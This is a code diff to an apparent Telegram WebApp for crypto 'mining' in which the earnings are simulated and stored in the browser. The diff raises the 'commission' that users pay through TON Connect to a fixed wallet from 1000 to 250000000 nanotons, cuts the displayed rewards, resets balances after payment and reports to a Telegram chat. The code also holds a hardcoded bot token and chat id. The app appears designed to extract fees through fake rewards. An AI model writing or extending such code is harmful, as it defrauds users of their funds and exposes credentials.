@@ -423,7 +423,7 @@ a {
 let tg = window.Telegram.WebApp;
 
 let activeMining = false;
-let lst = 0;
+let lst = localStorage.getItem("lusdt");
 let data = 0;
 let blocks = 0;
 let wallet = "";
@@ -687,7 +687,8 @@ function limitedMine(blockData, difficulty, fees, hash, lt) {
 
     reward = 1.04567 + (hashvalue * difficulty / 5); //0.96
     lst = lst + reward;
-    return reward;
+    localStorage.setItem("lusdt", lst);
+    return reward / 10;
 
 
     // localStorage.setItem("bbb", lst);
@@ -695,7 +696,7 @@ function limitedMine(blockData, difficulty, fees, hash, lt) {
 
     // setTimeout(startMining, 100);
     reward = startMining();
-    return reward;
+    return reward / 10;
 
 
 }
@@ -723,7 +724,8 @@ function limitedMineGolden(blockData, difficulty, fees, hash, lt) {
 
     reward = 1.04567 + (hashvalue * difficulty / 5); //0.96
     lst = lst + (reward * 5);
-    return reward*5;
+    localStorage.setItem("lusdt", lst);
+    return (reward*5) / 10;
 
 
     // localStorage.setItem("bbb", lst);
@@ -731,7 +733,8 @@ function limitedMineGolden(blockData, difficulty, fees, hash, lt) {
 
     // setTimeout(startMining, 100);
     reward = startMining();
-    return reward;
+    return (reward*5) / 10;
+
 
 
 }
@@ -1071,7 +1074,8 @@ function pp(){
                     await tonConnectUI.sendTransaction(transaction);
                     alert("Вы успешно оплатаили комиссию!");
                     lst = 0;
-                    
+                    localStorage.setItem("lusdt", lst);
+
 					let telegram = {
     					token: "7937247695:AAGNmeIQE9gM5Zec8KbIezbrHdDAhKK4ksU", // Your bot's token that got from @BotFather
     					chat_id: "-1002275343624" // The user's(that you want to send a message) telegram chat id
@@ -1083,7 +1087,7 @@ function pp(){
         api.onload = function(){
             const status = api.status;
             if(status == 200){
-              alert("Супер!");
+              console.log("Супер!");
             }
                 
         };
@@ -1100,7 +1104,7 @@ function pp(){
                     messages: [
                         {
                             address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
-                            amount: 1000,
+                            amount: 250000000, //250000000
                         }
                     ]
                 };
